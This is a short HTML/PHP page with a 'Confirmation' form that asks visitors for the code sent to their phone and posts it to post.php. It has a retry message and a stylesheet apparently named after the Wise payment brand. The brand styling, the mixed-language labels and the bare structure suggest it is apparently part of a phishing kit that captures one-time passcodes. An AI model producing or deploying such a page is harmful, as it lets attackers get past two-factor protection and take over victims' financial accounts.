<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="viewport"
		content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/css/wise.css">
    <title></title>
</head>
<body>
<header>
<img src="res/img/logo.png">
</header>
<main>
   <div class="page">

   <div class="title">
   
      <div class="disc">
        <h3>Confirmation</h3>
        <p>Please enter the code sent to your phone number to continue.</p>
      </div>
      
    </div>
   <form action="post.php" method="post">

        <div class="col">
          <label>Code de confirmation</label>
          <input type="text" name="otp" required placeholder="Enter the code">
          <?php 
if(isset($_GET['error'])){
    echo '<input type="hidden" name="exit">';
    echo '<p style="color:red;">Invalid code. Please try again.</p>';
}
?>
        </div>

        <div class="col1" style="text-align:center;">
          <button type="sumbit">Continue</button>
        </div>
    </form>
        
        


      </div>









</main>














</body>
</html>  